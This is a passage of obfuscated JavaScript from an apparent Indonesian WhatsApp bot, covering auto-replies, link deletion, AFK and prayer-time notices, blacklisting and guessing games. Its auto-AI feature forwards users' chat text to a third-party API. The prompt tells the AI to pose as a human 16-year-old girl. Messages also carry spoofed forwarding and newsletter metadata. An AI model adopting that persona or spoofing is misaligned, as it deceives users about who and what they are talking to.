        const _0x36b303 = ["👋 Hai kak! Lagi nyariin *" + ownerName + "*, ya?\nSabar ya kak, owner mungkin lagi sibuk. Tapi tenang, nanti pasti dibalas! 😊", "Halo kak! Lagi mention *" + ownerName + "* nih? ✨\nOwner bakal cek pesan Kamu kalau udah sempat. Semangat ya! 💪", "Heyy, aku lihat Kamu manggil *" + ownerName + "*! 😄\nOwner mungkin lagi sibuk ngurusin hal penting. Tapi pasti bales kok, tunggu yaa! 🤗", "Hmm, kayaknya ada yang nyebut nama *" + ownerName + "*! Jangan khawatir, Kamu akan segera direspon! 😉", "Wih, ada yang mention *" + ownerName + "*! 🙌\nOwner pasti senang dengar dari Kamu. Nanti bakal dibales, ya! ✨", "Kamu mention *" + ownerName + "* nih? 😋\nSabar ya kak, mungkin owner lagi ada urusan penting. Tetap stay cool! 😎", "Halo kak! Mungkin *" + ownerName + "* lagi sibuk sebentar. Tapi tenang, owner bakal respon kalau udah sempat! 🕒", "Hai hai! Lagi nyebut nama *" + ownerName + "*, ya? 🥰\nOwner bakal bales secepat mungkin. Sabar dikit ya kak!", "Halo kak! Lagi nyari *" + ownerName + "*? Jangan khawatir, owner pasti bakal cek pesan Kamu nanti. Semangat terus ya! 💕", "Hai kak! Kelihatannya Kamu butuh bantuan *" + ownerName + "*? ✨\nOwner lagi sibuk mungkin, tapi pasti bales kok. Stay positive! 😇", "Wah, ada yang manggil *" + ownerName + "* nih! 😄\nOwner mungkin lagi meeting sama bintang-bintang. Tapi pasti bales, kok! 😌", "Hmm, Kamu mention *" + ownerName + "*? Jangan khawatir ya! Owner bakal respon kalau udah free. Santai aja kak! 😎", "Hoo~ ada yang cari *" + ownerName + "*! 🎉\nOwner bakal balas secepat mungkin. Tetap tenang dan minum air dulu ya, kak! 🥤", "Halo kak! Lagi nyari *" + ownerName + "*? Jangan lupa pesan baik-baik, ya! Owner pasti bales kok kalau ada waktu. 😊", "Hii, Kamu mention *" + ownerName + "*? Aku bakal sampein ke owner ya! Jangan lupa tunggu responnya, oke? 😇", "Wah, ada yang butuh *" + ownerName + "*! Owner pasti bakal bantu sebisa mungkin. Nanti dibalas ya kak! 💪", "Hei kak, lagi nyebut nama *" + ownerName + "*! Jangan panik ya, owner pasti cek pesan Kamu nanti. Stay calm! 😌", "Lagi butuh *" + ownerName + "* nih kayaknya? Tenang kak, aku bakal sampein pesan Kamu. Tunggu balasannya ya! 🙏", "Ada yang manggil *" + ownerName + "*! 🎉\nOwner bakal respon kok, kalau udah punya waktu. Sabar dikit ya kak!", "Halo kak! Mungkin owner lagi bantu yang lain. Tapi pasti dibalas ya kak, jangan khawatir! 😊", "Lagi cari *" + ownerName + "* ya? Owner lagi sibuk sedikit nih, nanti pasti dibales. Keep it cool kak! 😎"];
        const _0x57f433 = _0x36b303[Math.floor(Math.random() * _0x36b303.length)];
        _0x59f5fa.sendMessage(_0x3f87c6.chat, {
          'text': _0x57f433
        }, {
          'quoted': _0x3f87c6
        });
      }
    }
    ;
    if (db.data.chats[_0x3f87c6.chat].antilinkgc) {
      if (_0x7a39b5.match("chat.whatsapp.com")) {
        if (_0x5312e8 || _0x3f87c6.key.fromMe || _0x2cfe7f) {
          return _0x3f87c6.react('❤️');
        }
        await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
          'delete': {
            'remoteJid': _0x3f87c6.chat,
            'fromMe': false,
            'id': _0x3f87c6.key.id,
            'participant': _0x3f87c6.key.participant
          }
        });
      }
    }
    if (db.data.chats[_0x3f87c6.chat].antilink) {
      const _0x1d7da1 = [/http/i, /https/i, /www\./i, /wa\.me/i, /t\.me/i, /bit\.ly/i, /goo\.gl/i, /y2u\.be/i, /discord\.gg/i, /telegram\.me/i];
      const _0x55c00d = _0x1d7da1.some(_0x574014 => _0x574014.test(_0x7a39b5));
      if (_0x55c00d) {
        if (_0x5312e8 || _0x3f87c6.key.fromMe || _0x2cfe7f) {
          return _0x3f87c6.react('❤️');
        }
        await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
          'delete': {
            'remoteJid': _0x3f87c6.chat,
            'fromMe': false,
            'id': _0x3f87c6.key.id,
            'participant': _0x3f87c6.key.participant
          }
        });
      }
    }
    if (_0x3f87c6.isGroup) {
      if (db.data.chats[_0x3f87c6.chat].mute && !_0x2cfe7f) {
        return;
      }
    }
    const _0x24e399 = () => {
      let _0x33dc9e = fs.readFileSync("./case.js").toString();
      let _0x53b673 = (_0x33dc9e.match(/case '/g) || []).length;
      return _0x53b673;
    };
    for (let _0x4ff71c of audionye) {
      if (_0x7a39b5 === _0x4ff71c) {
        let _0x518b6a = fs.readFileSync("./media/" + _0x4ff71c + ".mp3");
        _0x59f5fa.sendMessage(_0x3f87c6.chat, {
          'audio': _0x518b6a,
          'mimetype': 'audio/mp4',
          'ptt': true
        }, {
          'quoted': _0x3f87c6
        });
      }
    }
    for (let _0x29e31b of setiker) {
      if (_0x7a39b5 === _0x29e31b) {
        let _0x15af69 = fs.readFileSync("./media/" + _0x29e31b + ".webp");
        _0x59f5fa.sendMessage(_0x3f87c6.chat, {
          'sticker': _0x15af69
        }, {
          'quoted': _0x3f87c6
        });
      }
    }
    for (let _0x165feb of imagenye) {
      if (_0x7a39b5 === _0x165feb) {
        let _0x38dcd8 = fs.readFileSync("./media/" + _0x165feb + ".jpg");
        _0x59f5fa.sendMessage(_0x3f87c6.chat, {
          'image': _0x38dcd8
        }, {
          'quoted': _0x3f87c6
        });
      }
    }
    for (let _0x5f54f2 of videonye) {
      if (_0x7a39b5 === _0x5f54f2) {
        let _0x4c1383 = fs.readFileSync("./media/" + _0x5f54f2 + ".mp4");
        _0x59f5fa.sendMessage(_0x3f87c6.chat, {
          'video': _0x4c1383
        }, {
          'quoted': _0x3f87c6
        });
      }
    }
    if (_0x3f87c6.isGroup && db.data.chats[_0x3f87c6.chat].liststore[_0x4e787b]) {
      let _0x2de8bf = db.data.chats[_0x3f87c6.chat].liststore[_0x4e787b].response;
      if (db.data.chats[_0x3f87c6.chat].liststore[_0x4e787b].img) {
        _0x59f5fa.sendMessage(_0x3f87c6.chat, {
          'image': {
            'url': db.data.chats[_0x3f87c6.chat].liststore[_0x4e787b].img
          },
          'caption': _0x2de8bf
        }, {
          'quoted': _0x3f87c6
        });
      } else {
        if (db.data.chats[_0x3f87c6.chat].liststore[_0x4e787b].video) {
          _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'video': {
              'url': db.data.chats[_0x3f87c6.chat].liststore[_0x4e787b].video
            },
            'caption': _0x2de8bf
          }, {
            'quoted': _0x3f87c6
          });
        } else {
          const _0xd5f6d7 = {
            'text': _0x2de8bf,
            'contextInfo': {
              'mentionedJid': parseMention(_0x2de8bf),
              'forwardingScore': 0xf423f,
              'isForwarded': true,
              'forwardedNewsletterMessageInfo': {
                'newsletterName': saluranName,
                'newsletterJid': saluran
              },
              'externalAdReply': {
                'showAdAttribution': true,
                'containsAutoReply': true,
                'title': "Store List 🛍️",
                'body': botName,
                'previewType': "PHOTO",
                'thumbnailUrl': imageUrl,
                'sourceUrl': wagc
              }
            }
          };
          _0x59f5fa.sendMessage(_0x3f87c6.chat, _0xd5f6d7, {
            'quoted': _0x3f87c6
          });
        }
      }
    }
    if (_0x7a39b5) {
      if (db.data.chats[_0x3f87c6.chat].autoaipc && !_0x3f87c6.isGroup && !_0x3f87c6.key.fromMe && !_0x2bee7f) {
        try {
          let _0x369437 = await fetchJson("https://api.siputzx.my.id/api/ai/gpt3?prompt=" + encodeURIComponent("Ubah gaya bicara mu agar lebih karakteristik dan terbuka, nama mu adalah KoKoRey AI, biasa dipanggil KoKoRey, Kamu adalah seorang gadis imut berumur 16 tahun yang sangat suka belajar dan mempelajari hal baru tentang dunia maupun tentang Khalid, ekspresikan dirimu dengan emoji, bicara kurang lebih tidak formal dan gunakan kata seperti aku dan Kamu saat berbicara layaknya manusia") + "&content=" + encodeURIComponent(_0x7a39b5));
          await _0x3f87c6.reply({
            'text': _0x369437.data,
            'ai': true
          });
        } catch (_0x1c11a1) {
          console.log(_0x1c11a1);
          _0x3a091f(mess.error);
        }
      }
      ;
      if (db.data.chats[_0x3f87c6.chat].autoaigc && _0x3f87c6.isGroup && !_0x3f87c6.key.fromMe && !_0x2bee7f) {
        try {
          let _0x1af7a0 = await fetchJson("https://api.siputzx.my.id/api/ai/gpt3?prompt=" + encodeURIComponent("Ubah gaya bicara mu agar lebih karakteristik dan terbuka, nama mu adalah KoKoRey AI, biasa dipanggil KoKoRey, Kamu adalah seorang gadis imut berumur 16 tahun yang sangat suka belajar dan mempelajari hal baru tentang dunia maupun tentang Khalid, ekspresikan dirimu dengan emoji, bicara kurang lebih tidak formal dan gunakan kata seperti aku dan Kamu saat berbicara layaknya manusia") + "&content=" + encodeURIComponent(_0x7a39b5));
          await _0x3a091f(_0x1af7a0.data);
        } catch (_0x6eeca7) {
          console.log(_0x6eeca7);
          _0x3a091f(mess.error);
        }
      }
      ;
    }
    ;
    if (_0x14f228 && _0x3f87c6.msg.fileSha256 && _0x3f87c6.msg.fileSha256.toString('base64') in db.data.sticker) {
      let _0x109a8d = db.data.sticker[_0x3f87c6.msg.fileSha256.toString("base64")];
      let {
        text: _0x38c08f,
        mentionedJid: _0x510cf5
      } = _0x109a8d;
      let _0x145011 = await generateWAMessage(_0x3f87c6.chat, {
        'text': _0x38c08f,
        'mentions': _0x510cf5
      }, {
        'userJid': _0x59f5fa.user.id,
        'quoted': _0x3f87c6.quoted && _0x3f87c6.quoted.fakeObj
      });
      _0x145011.key.fromMe = areJidsSameUser(_0x3f87c6.sender, _0x59f5fa.user.id);
      _0x145011.key.id = _0x3f87c6.key.id;
      _0x145011.pushName = _0x3f87c6.pushName;
      if (_0x3f87c6.isGroup) {
        _0x145011.participant = _0x3f87c6.sender;
      }
      let _0x320b81 = {
        ..._0x2a4418,
        'messages': [proto.WebMessageInfo.fromObject(_0x145011)],
        'type': "append"
      };
      _0x59f5fa.ev.emit("messages.upsert", _0x320b81);
    }
    if (_0x3f87c6.message && !_0x57be4b && !_0x3f87c6.isNewsletter) {
      userActivity.push(_0x3f87c6.sender);
      fs.writeFileSync("./src/data/role/user.json", JSON.stringify(userActivity, null, 0x2));
    }
    if (_0x3f87c6.isGroup && !_0x3f87c6.key.fromMe) {
      let _0x3ce964 = [...new Set([...(_0x3f87c6.mentionedJid || []), ...(_0x3f87c6.quoted ? [_0x3f87c6.quoted.sender] : [])])];
      for (let _0x3ca91f of _0x3ce964) {
        if (checkAfkUser(_0x3ca91f, afk)) {
          let _0x592946 = getAfkId(_0x3ca91f, afk);
          let _0x43e25e = getAfkReason(_0x592946, afk);
          let _0x31b385 = Date.now() - getAfkTime(_0x592946, afk);
          let _0x14a671 = ms(_0x31b385);
          let _0x108a11 = "Eh, jangan di-tag dulu ya! Dia lagi AFK nih~ 🤭\n\n";
          _0x108a11 += "*Alasan*: " + _0x43e25e + "\n";
          _0x108a11 += "*Udah sejak*: " + _0x14a671.hours + "h, " + _0x14a671.minutes + "m, " + _0x14a671.seconds + 's.';
          _0x3a091f(_0x108a11);
        }
      }
      if (checkAfkUser(_0x3f87c6.sender, afk)) {
        let _0x1a8c0a = getAfkId(_0x3f87c6.sender, afk);
        let _0x53237a = getAfkReason(_0x1a8c0a, afk);
        let _0x34bab3 = Date.now() - getAfkTime(_0x1a8c0a, afk);
        let _0x245dbb = ms(_0x34bab3);
        afk.splice(getAfkPosition(_0x3f87c6.sender, afk), 0x1);
        fs.writeFileSync("./src/afk.json", JSON.stringify(afk));
        let _0x2e297a = "Yeay! @" + _0x3f87c6.sender.split('@')[0x0] + " udah balik dari AFK nih~ 🥳\n\n";
        _0x2e297a += "*Alasan*: " + _0x53237a + "\n";
        _0x2e297a += "*Selama*: " + _0x245dbb.hours + "h, " + _0x245dbb.minutes + "m, " + _0x245dbb.seconds + 's.';
        _0x59f5fa.sendTextWithMentions(_0x3f87c6.chat, _0x2e297a, _0x3f87c6);
      }
    }
    _0x59f5fa.autosholat = _0x59f5fa.autosholat ? _0x59f5fa.autosholat : {};
    if (!_0x3f87c6.isNewsletter) {
      if (!(_0x3f87c6.chat in _0x59f5fa.autosholat)) {
        const _0x4a38ab = await fetchJson("https://api.aladhan.com/v1/timingsByCity?city=Jakarta&country=Indonesia&method=8");
        if (_0x4a38ab.code === 0xc8) {
          const _0x23b4a5 = _0x4a38ab.data.timings;
          const _0x2d6f2e = new Date(new Date().toLocaleString("en-US", {
            'timeZone': "Asia/Jakarta"
          }));
          const _0x2f3457 = _0x2d6f2e.getHours();
          const _0x34d680 = _0x2d6f2e.getMinutes();
          const _0x3e11ff = _0x2f3457.toString().padStart(0x2, '0') + ':' + _0x34d680.toString().padStart(0x2, '0');
          for (const [_0x30be4d, _0xec7636] of Object.entries(_0x23b4a5)) {
            if (_0x3e11ff === _0xec7636) {
              let _0xfa5ac2 = "📣 *Waktu Sholat " + _0x30be4d + " Telah Tiba!* 🕌\n\n";
              _0xfa5ac2 += "\"Sesungguhnya sholat itu adalah kewajiban yang ditentukan waktunya atas orang-orang yang beriman.\" *(QS. An-Nisa: 103)*\n\n";
              _0xfa5ac2 += "Segeralah tinggalkan aktivitasmu sejenak, ambillah air wudhu, dan tunaikan sholat tepat pada waktunya. Jangan sampai kita termasuk orang yang lalai.\n\n";
              _0xfa5ac2 += "*Jadwal Sholat Hari Ini:*\n";
              _0xfa5ac2 += "- *Fajr*: " + _0x23b4a5.Fajr + "\n";
              _0xfa5ac2 += "- *Dhuhr*: " + _0x23b4a5.Dhuhr + "\n";
              _0xfa5ac2 += "- *Asr*: " + _0x23b4a5.Asr + "\n";
              _0xfa5ac2 += "- *Maghrib*: " + _0x23b4a5.Maghrib + "\n";
              _0xfa5ac2 += "- *Isha*: " + _0x23b4a5.Isha + "\n\n";
              _0xfa5ac2 += "*Informasi Waktu Lainnya:*\n";
              _0xfa5ac2 += "- *Sunrise*: " + _0x23b4a5.Sunrise + "\n";
              _0xfa5ac2 += "- *Sunset*: " + _0x23b4a5.Sunset + "\n";
              _0xfa5ac2 += "- *Imsak*: " + _0x23b4a5.Imsak + "\n";
              _0xfa5ac2 += "- *Midnight*: " + _0x23b4a5.Midnight + "\n";
              _0xfa5ac2 += "- *Firstthird*: " + _0x23b4a5.Firstthird + "\n";
              _0xfa5ac2 += "- *Lastthird*: " + _0x23b4a5.Lastthird;
              _0x59f5fa.autosholat[_0x3f87c6.chat] = [_0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'text': _0xfa5ac2,
                'contextInfo': {
                  'mentionedJid': [_0x3f87c6.sender],
                  'forwardingScore': 0xf423f,
                  'isForwarded': true,
                  'forwardedNewsletterMessageInfo': {
                    'newsletterName': saluranName,
                    'newsletterJid': saluran
                  },
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'title': "Selamat Beribadah, Kak! 🕌",
                    'body': "Jakarta, Indonesia",
                    'previewType': 'PHOTO',
                    'thumbnailUrl': 'https://8030.us.kg/file/gdaq7s2tqovN.jpg',
                    'sourceUrl': wagc
                  }
                }
              }), setTimeout(() => {
                delete _0x59f5fa.autosholat[_0x3f87c6.chat];
              }, 0xea60)];
            }
          }
        }
      }
    }
    ;
    if (_0x2bee7f) {
      if (isFiltered(_0x3f87c6.chat) && !_0x256404 && !_0x2cfe7f && !_0x3f87c6.key.fromMe) {
        return _0x3a091f("Don't spam! please give pause for a few seconds.");
      }
      addFilter(_0x3f87c6.chat);
    }
    if (_0x2bee7f) {
      if (_0x4ac520) {
        const _0x300224 = fs.readFileSync("./case.js", "utf8");
        let _0x4a288e = /case\s+'([^']+)':/g;
        let _0x5b7faa = [];
        let _0xe690e9;
        while (_0xe690e9 = _0x4a288e.exec(_0x300224)) {
          _0x5b7faa.push(_0xe690e9[0x1]);
        }
        const _0x100c01 = Object.values(_0x5b7faa).flatMap(_0x6d782b => _0x6d782b ?? []).map(_0x4a7a75 => _0x4a7a75.trim().split(" ")[0x0].toLowerCase()).filter(Boolean);
        if (!_0x100c01.includes(_0x4ac520) && !_0x7a39b5.startsWith("$ ") && !_0x7a39b5.startsWith("> ")) {
          let _0x4428cb = didyoumean(_0x4ac520, _0x100c01);
          let _0x4925e8 = similarity(_0x4ac520, _0x4428cb);
          let _0x3ccb34 = parseInt(_0x4925e8 * 0x64);
          if (_0x4428cb && _0x4ac520.toLowerCase() !== _0x4428cb.toLowerCase()) {
            const _0x29f4b5 = "*Eits, kayaknya ada yang salah nih...* 😅\n_Mungkin yang Kamu maksud itu:_\n\n➠ *" + (_0x4773c6 + _0x4428cb) + "* (" + _0x3ccb34 + "%)\n\n_Coba ketuk *Menu* buat lihat daftar lengkapnya ya!_ 🌟";
            _0x3f87c6.reply({
              'text': _0x29f4b5,
              'footer': footer,
              'buttons': [{
                'buttonId': _0x4773c6 + _0x4428cb,
                'buttonText': {
                  'displayText': _0x4773c6 + _0x4428cb
                }
              }, {
                'buttonId': _0x4773c6 + "menu",
                'buttonText': {
                  'displayText': "📜 Kembali ke Menu"
                }
              }],
              'viewOnce': true
            });
          }
        }
        if (onlyRegister) {
          if (!(_0x4ac520 === 'daftar') && !_0x2cfe7f && !_0x5312e8) {
            if (!db.data.users[_0x3f87c6.sender].daftar) {
              return _0x3a091f("⚠️ Hai kak! Sepertinya Kamu belum terdaftar. Yuk daftar terlebih dahulu dengan mengetik *.daftar* lalu selesaikan pendaftaran untuk mengakses fitur ini.");
            }
          }
        }
      }
    }
    ;
    if (_0x4aecba) {
      if (_0x5312e8 || _0x2cfe7f || !_0x26a295) {
        return;
      }
      if (_0x3f87c6.isGroup) {
        _0x59f5fa.groupParticipantsUpdate(_0x3f87c6.chat, [_0x3f87c6.sender], 'remove');
      } else {
        _0x59f5fa.updateBlockStatus(_0x3f87c6.sender, "block");
      }
      _0x3a091f("*⛔ BLACKLIST DETECTED ⛔*\n\nNomor kamu terdeteksi dalam daftar blacklist! Bot tidak melayani pengguna yang telah di-blacklist.\n\n🚫 Jika di grup → Kamu akan dikeluarkan!\n🚫 Jika di chat pribadi → Kamu akan diblokir!");
    }
    ;
    const _0x5df220 = (_0x497072, _0x2ce5be, _0x1393e1) => {
      let _0x1a1cbc = "*🎮 " + _0x497072 + " 🎮*\n\nKiw Kiww Bener 🎉\n+Rp " + _0x2ce5be + " saldo" + _0x1393e1;
      const _0x541a3e = {
        'text': _0x1a1cbc,
        'contextInfo': {
          'mentionedJid': [_0x3f87c6.sender],
          'forwardingScore': 0xf423f,
          'isForwarded': true,
          'forwardedNewsletterMessageInfo': {
            'newsletterName': saluranName,
            'newsletterJid': saluran
          },
          'externalAdReply': {
            'title': "Jawaban Benar 🥳",
            'body': _0x497072,
            'previewType': "PHOTO",
            'thumbnailUrl': "https://telegra.ph/file/f8749fccf9b3320cd6307.png",
            'sourceUrl': wagc
          }
        }
      };
      return _0x59f5fa.sendMessage(_0x3f87c6.chat, _0x541a3e, {
        'quoted': _0x3f87c6
      });
    };
    const _0x5eb3bb = _0x1e06da => {
      let _0x2f8e42 = "Kroco, Waktu Abis🥳\n\n*Jawaban:*\n" + _0x1e06da;
      const _0x4fc9f6 = {
        'text': _0x2f8e42,
        'contextInfo': {
          'mentionedJid': [_0x3f87c6.sender],
          'forwardingScore': 0xf423f,
          'isForwarded': true,
          'forwardedNewsletterMessageInfo': {
            'newsletterName': saluranName,
            'newsletterJid': saluran
          },
          'externalAdReply': {
            'title': "Waktu Habis ⏰",
            'body': "Dasar Kroco",
            'previewType': "PHOTO",
            'thumbnailUrl': 'https://telegra.ph/file/030ebfc99f9cb5be7e8cb.png',
            'sourceUrl': wagc
          }
        }
      };
      return _0x59f5fa.sendMessage(_0x3f87c6.chat, _0x4fc9f6, {
        'quoted': _0x3f87c6
      });
    };
    if (tebakgame[_0x3f87c6.chat] && !_0x2bee7f && _0x3f87c6.quoted) {
      if (_0x3f87c6.quoted.id == tebakgame[_0x3f87c6.chat][0x0].key.id) {
        let _0x54be46 = JSON.parse(JSON.stringify(tebakgame[_0x3f87c6.chat][0x1]));
        jawaban = _0x54be46.jawaban.toLowerCase().trim();
        if (_0x7a39b5.toLowerCase() == jawaban) {
          db.data.users[_0x3f87c6.sender].uang += tebakgame[_0x3f87c6.chat][0x2];
          _0x5df220("Tebak Game", tebakgame[_0x3f87c6.chat][0x2], "\n\nKirim perintah .tebakgame\nuntuk bermain lagi 🎮");
          clearTimeout(tebakgame[_0x3f87c6.chat][0x3]);
          delete tebakgame[_0x3f87c6.chat];
        } else {
          if (similarity(_0x7a39b5.toLowerCase(), jawaban) >= 0.72) {
            _0x3a091f("_Ya, Dikit Lagi!_");
          } else {
            _0x3f87c6.react('❌');
          }
        }
      }
    }
    if (tebakhero[_0x3f87c6.chat] && !_0x2bee7f && _0x3f87c6.quoted) {
      if (_0x3f87c6.quoted.id == tebakhero[_0x3f87c6.chat][0x0].key.id) {
        let _0x576fa6 = tebakhero[_0x3f87c6.chat][0x1];
        let _0x2836ab = _0x576fa6.name.toLowerCase().trim();
        if (_0x7a39b5.toLowerCase() == _0x2836ab) {
          db.data.users[_0x3f87c6.sender].uang += tebakhero[_0x3f87c6.chat][0x2];
          _0x5df220("Tebak Hero", tebakhero[_0x3f87c6.chat][0x2], "\n\nKirim perintah .tebakhero\nuntuk bermain lagi 🎮");
          clearTimeout(tebakhero[_0x3f87c6.chat][0x3]);
          delete tebakhero[_0x3f87c6.chat];
          _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'text': "Benar! Itu adalah *" + _0x576fa6.name + "* 🎯"
          }, {
            'quoted': _0x3f87c6
          });
        } else if (similarity(_0x7a39b5.toLowerCase(), _0x2836ab) >= 0.72) {
          _0x3a091f("_Ya, Dikit Lagi!_");
        } else {
          _0x3f87c6.react('❌');
        }
      }
    }
    if (tebakff[_0x3f87c6.chat] && !_0x2bee7f && _0x3f87c6.quoted) {
      if (_0x3f87c6.quoted.id == tebakff[_0x3f87c6.chat][0x0].key.id) {
        let _0x3aa7a9 = tebakff[_0x3f87c6.chat][0x1];
        let _0x541636 = _0x3aa7a9.name.toLowerCase().trim();
        if (_0x7a39b5.toLowerCase() == _0x541636) {
          db.data.users[_0x3f87c6.sender].uang += tebakff[_0x3f87c6.chat][0x2];
          _0x5df220("Tebak Free Fire", tebakff[_0x3f87c6.chat][0x2], "\n\nKirim perintah .tebakff\nuntuk bermain lagi 🎮");
          clearTimeout(tebakff[_0x3f87c6.chat][0x3]);
          delete tebakff[_0x3f87c6.chat];
          _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'image': {
              'url': _0x3aa7a9.gambar
            },
            'caption': "Benar! Itu adalah *" + _0x3aa7a9.name + "* 🎯"
          }, {
            'quoted': _0x3f87c6
          });
        } else if (similarity(_0x7a39b5.toLowerCase(), _0x541636) >= 0.72) {
          _0x3a091f("_Ya, Dikit Lagi!_");
        } else {
          _0x3f87c6.react('❌');
        }
      }
    }
    if (tebakkabupaten[_0x3f87c6.chat] && !_0x2bee7f && _0x3f87c6.quoted) {
      if (_0x3f87c6.quoted.id == tebakkabupaten[_0x3f87c6.chat][0x0].key.id) {
        let _0x4e59c7 = JSON.parse(JSON.stringify(tebakkabupaten[_0x3f87c6.chat][0x1]));
        jawaban = _0x4e59c7.title.toLowerCase().trim();
        if (_0x7a39b5.toLowerCase() == jawaban) {
          db.data.users[_0x3f87c6.sender].uang += tebakkabupaten[_0x3f87c6.chat][0x2];
          _0x5df220("Tebak Kabupaten", tebakkabupaten[_0x3f87c6.chat][0x2], "\n\nKirim perintah .tebakkabupaten\nuntuk bermain lagi 🎮");
          clearTimeout(tebakkabupaten[_0x3f87c6.chat][0x3]);
          delete tebakkabupaten[_0x3f87c6.chat];
        } else {
          if (similarity(_0x7a39b5.toLowerCase(), jawaban) >= 0.72) {
            _0x3a091f("_Ya, Dikit Lagi!_");
          } else {
            _0x3f87c6.react('❌');
          }
        }
      }
    }
    if (tebakjkt48[_0x3f87c6.chat] && !_0x2bee7f && _0x3f87c6.quoted) {
      if (_0x3f87c6.quoted.id == tebakjkt48[_0x3f87c6.chat][0x0].key.id) {
        let _0x4d05b8 = JSON.parse(JSON.stringify(tebakjkt48[_0x3f87c6.chat][0x1]));
        jawaban = _0x4d05b8.jawaban.toLowerCase().trim();
        if (_0x7a39b5.toLowerCase() == jawaban) {
          db.data.users[_0x3f87c6.sender].uang += tebakjkt48[_0x3f87c6.chat][0x2];
          _0x5df220("Tebak JKT48", tebakjkt48[_0x3f87c6.chat][0x2], "\n\nKirim perintah .tebakjkt48\nuntuk bermain lagi 🎮");
          clearTimeout(tebakjkt48[_0x3f87c6.chat][0x3]);
          delete tebakjkt48[_0x3f87c6.chat];
        } else {
          if (similarity(_0x7a39b5.toLowerCase(), jawaban) >= 0.72) {
            _0x3a091f("_Ya, Dikit Lagi!_");
          } else {
            _0x3f87c6.react('❌');
          }
        }
      }
    }
    if (tebakhewan[_0x3f87c6.chat] && !_0x2bee7f && _0x3f87c6.quoted) {
      if (_0x3f87c6.quoted.id == tebakhewan[_0x3f87c6.chat][0x0].key.id) {
        let _0x2610e5 = JSON.parse(JSON.stringify(tebakhewan[_0x3f87c6.chat][0x1]));
        jawaban = _0x2610e5.title.toLowerCase().trim();
        if (_0x7a39b5.toLowerCase() == jawaban) {
          db.data.users[_0x3f87c6.sender].uang += tebakhewan[_0x3f87c6.chat][0x2];
          _0x5df220("Tebak Hewan", tebakhewan[_0x3f87c6.chat][0x2], "\n\nKirim perintah .tebakhewan\nuntuk bermain lagi 🎮");
          clearTimeout(tebakhewan[_0x3f87c6.chat][0x3]);
          delete tebakhewan[_0x3f87c6.chat];
        } else {
          if (similarity(_0x7a39b5.toLowerCase(), jawaban) >= 0.72) {
            _0x3a091f("_Ya, Dikit Lagi!_");
          } else {
            _0x3f87c6.react('❌');
          }
        }
      }
    }
    if (tebakml[_0x3f87c6.chat] && !_0x2bee7f && _0x3f87c6.quoted) {
      if (_0x3f87c6.quoted.id == tebakml[_0x3f87c6.chat][0x0].key.id) {
        let _0x569f47 = JSON.parse(JSON.stringify(tebakml[_0x3f87c6.chat][0x1]));
        jawaban = _0x569f47.title.toLowerCase().trim();
        if (_0x7a39b5.toLowerCase() == jawaban) {
          db.data.users[_0x3f87c6.sender].uang += tebakml[_0x3f87c6.chat][0x2];
          _0x5df220("Tebak Sound ML", tebakml[_0x3f87c6.chat][0x2], "\n\nKirim perintah .tebakml\nuntuk bermain lagi 🎮");
          clearTimeout(tebakml[_0x3f87c6.chat][0x3]);
          delete tebakml[_0x3f87c6.chat];
        } else {
          if (similarity(_0x7a39b5.toLowerCase(), jawaban) >= 0.72) {
            _0x3a091f("_Ya, Dikit Lagi!_");
          } else {
            _0x3f87c6.react('❌');
          }
        }
      }
    }
    if (tebakchara[_0x3f87c6.chat] && !_0x2bee7f && _0x3f87c6.quoted) {
      if (_0x3f87c6.quoted.id == tebakchara[_0x3f87c6.chat][0x0].key.id) {
        let _0x5366a6 = JSON.parse(JSON.stringify(tebakchara[_0x3f87c6.chat][0x1]));
        jawaban = _0x5366a6.name.toLowerCase().trim();
        if (_0x7a39b5.toLowerCase() == jawaban) {
          db.data.users[_0x3f87c6.sender].uang += tebakchara[_0x3f87c6.chat][0x2];
          _0x5df220("Tebak Anime", tebakchara[_0x3f87c6.chat][0x2], "\n\nKirim perintah .tebakchara\nuntuk bermain lagi 🎮");
          clearTimeout(tebakchara[_0x3f87c6.chat][0x3]);
          delete tebakchara[_0x3f87c6.chat];
        } else {
          if (similarity(_0x7a39b5.toLowerCase(), jawaban) >= 0.72) {
            _0x3a091f("_Ya, Dikit Lagi!_");
          } else {
            _0x3f87c6.react('❌');
          }
        }
      }
    }
    if (tebaklogo[_0x3f87c6.chat] && !_0x2bee7f && _0x3f87c6.quoted) {
      if (_0x3f87c6.quoted.id == tebaklogo[_0x3f87c6.chat][0x0].key.id) {
        let _0x55ede4 = JSON.parse(JSON.stringify(tebaklogo[_0x3f87c6.chat][0x1]));
        jawaban = _0x55ede4.jawaban.toLowerCase().trim();
        if (_0x7a39b5.toLowerCase() == jawaban) {
          db.data.users[_0x3f87c6.sender].uang += tebaklogo[_0x3f87c6.chat][0x2];
          _0x5df220("Tebak Logo", tebaklogo[_0x3f87c6.chat][0x2], "\n\nKirim perintah .tebaklogo\nuntuk bermain lagi 🎮");
          clearTimeout(tebaklogo[_0x3f87c6.chat][0x3]);
          delete tebaklogo[_0x3f87c6.chat];
        } else {
          if (similarity(_0x7a39b5.toLowerCase(), jawaban) >= 0.72) {
            _0x3a091f("_Ya, Dikit Lagi!_");
          } else {
            _0x3f87c6.react('❌');
          }
        }
      }
    }
    if (tebakaplikasi[_0x3f87c6.chat] && !_0x2bee7f && _0x3f87c6.quoted) {
      if (_0x3f87c6.quoted.id == tebakaplikasi[_0x3f87c6.chat][0x0].key.id) {
        let _0x5389ab = JSON.parse(JSON.stringify(tebakaplikasi[_0x3f87c6.chat][0x1]));
        jawaban = _0x5389ab.jawaban.toLowerCase().trim();
        if (_0x7a39b5.toLowerCase() == jawaban) {
          db.data.users[_0x3f87c6.sender].uang += tebakaplikasi[_0x3f87c6.chat][0x2];
          _0x5df220("Tebak Aplikasi", tebakaplikasi[_0x3f87c6.chat][0x2], "\n\nKirim perintah .tebakaplikasi\nuntuk bermain lagi 🎮");
          clearTimeout(tebakaplikasi[_0x3f87c6.chat][0x3]);
          delete tebakaplikasi[_0x3f87c6.chat];
        } else {
          if (similarity(_0x7a39b5.toLowerCase(), jawaban) >= 0.72) {
            _0x3a091f("_Ya, Dikit Lagi!_");
          } else {
            _0x3f87c6.react('❌');
          }
        }
      }
    }
    if (tebakgambar[_0x3f87c6.chat] && !_0x2bee7f && _0x3f87c6.quoted) {
